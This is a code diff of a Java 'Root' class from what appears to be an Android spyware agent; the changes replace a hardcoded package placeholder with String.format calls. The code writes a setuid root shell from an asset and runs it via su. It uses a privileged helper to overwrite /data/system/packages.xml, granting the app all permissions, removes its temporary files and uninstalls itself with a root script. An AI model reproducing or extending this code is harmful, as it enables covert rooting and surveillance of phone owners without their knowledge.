@@ -107,7 +107,7 @@ public class Root {
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = M.e("#!/system/bin/sh") + "\n";
 		script += "/system/bin/rilcap ru\n";
-		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName +"\n";
+		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
 
 		String filename = "c";
 		if (createScript(filename, script) == false) {
@@ -121,7 +121,8 @@ public class Root {
 		Execute ex = new Execute();
 		ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout), StringUtils.join(result.stderr));
+			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
+					StringUtils.join(result.stderr));
 		}
 
 		removeScript(filename);
@@ -150,35 +151,38 @@ public class Root {
 		InputStream stream = Utils.getAssetStream("s.bin");
 
 		try {
-			// 0x5A3D10448D7A912A
 			fileWrite(suidext, stream, Cfg.RNDDB);
-
+			String pack = Status.self().getAppContext().getPackageName();
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
-				Check.log(TAG + " (superapkRoot): " + M.e("su -c /data/data/$PACK$/files/s")); //$NON-NLS-1$
+
+				Check.log(TAG + " (superapkRoot): " + String.format(M.e("su -c /data/data/%s/files/s"), pack)); //$NON-NLS-1$
 			}
 
 			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
 
 			// 32.29 = /data/data/com.android.service/files/statusdb rt
 			// 32_34=#!/system/bin/sh\n
-			String script = M.e("#!/system/bin/sh") + "\n" + M.e("/data/data/$PACK$/files/statusdb rt") + "\n";
+			String script = M.e("#!/system/bin/sh") + "\n"
+					+ String.format(M.e("/data/data/%s/files/statusdb rt"), pack) + "\n";
 
 			if (Root.createScript("s", script) == true) {
 				// 32_7=/system/bin/chmod 755
 				Process runScript = Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/s");
 				int ret = runScript.waitFor();
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (superapkRoot) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/s" + " ret: "
-							+ ret);
+					Check.log(TAG + " (superapkRoot) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/s"
+							+ " ret: " + ret);
 				}
 
 				// su -c /data/data/com.android.service/files/s
-				Process localProcess = Runtime.getRuntime().exec(M.e("su -c /data/data/$PACK$/files/s"));
+				Process localProcess = Runtime.getRuntime().exec(
+						String.format(M.e("su -c /data/data/%s/files/s"), pack));
 				ret = localProcess.waitFor();
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (superapkRoot) execute 2: " + M.e("su -c /data/data/$PACK$/files/s") + " ret: " + ret);
+					Check.log(TAG + " (superapkRoot) execute 2: "
+							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + ret);
 				}
 
 				Root.removeScript("s");
@@ -527,7 +531,8 @@ public class Root {
 			if (path.length() == 0) {
 				return 0;
 			}
-
+			String pack = Status.self().getAppContext().getPackageName();
+			
 			// Vediamo se gia' ci sono i permessi richiesti
 			if (pi.checkRequiredPermission() == true) {
 				if (Cfg.DEBUG) {
@@ -536,7 +541,7 @@ public class Root {
 
 				// Rimuoviamo la nostra copia
 				// /data/data/com.android.service/files/packages.xml
-				File f = new File(M.e("/data/data/$PACK$/files/packages.xml"));
+				File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"),pack));
 
 				if (f.exists() == true) {
 					f.delete();
@@ -547,7 +552,7 @@ public class Root {
 
 			// perm.xml
 			pi.addRequiredPermissions(M.e("perm.xml"));
-
+			
 			// .apk con tutti i permessi nel manifest
 
 			// TODO riabilitare le righe quando si reinserira' l'exploit
@@ -559,16 +564,16 @@ public class Root {
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
 			// /data/data/com.android.service/files/layout >
-			ex.execute(M.e("/system/bin/rilcap qzx \"cat /data/data/$PACK$/files/layout > ") + path + "\"");
+			ex.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/layout > "),pack) + path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
 			// /system/bin/ntpsvd qzx
 			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
-			ex.execute(M.e("/system/bin/rilcap qzx \"cat /data/data/$PACK$/files/perm.xml > /data/system/packages.xml\""));
+			ex.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),pack));
 
 			// Rimuoviamo la nostra copia
 			// /data/data/com.android.service/files/packages.xml
-			File f = new File(M.e("/data/data/$PACK$/files/packages.xml"));
+			File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"),pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -576,7 +581,7 @@ public class Root {
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/perm.xml
-			f = new File(M.e("/data/data/$PACK$/files/perm.xml"));
+			f = new File(String.format(M.e("/data/data/%s/files/perm.xml"),pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -584,7 +589,7 @@ public class Root {
 
 			// Rimuoviamo l'apk con tutti i permessi
 			// /data/data/com.android.service/files/layout
-			f = new File(M.e("/data/data/$PACK$/files/layout"));
+			f = new File(String.format(M.e("/data/data/%s/files/layout"),pack));
 
 			if (f.exists() == true) {
 				f.delete();
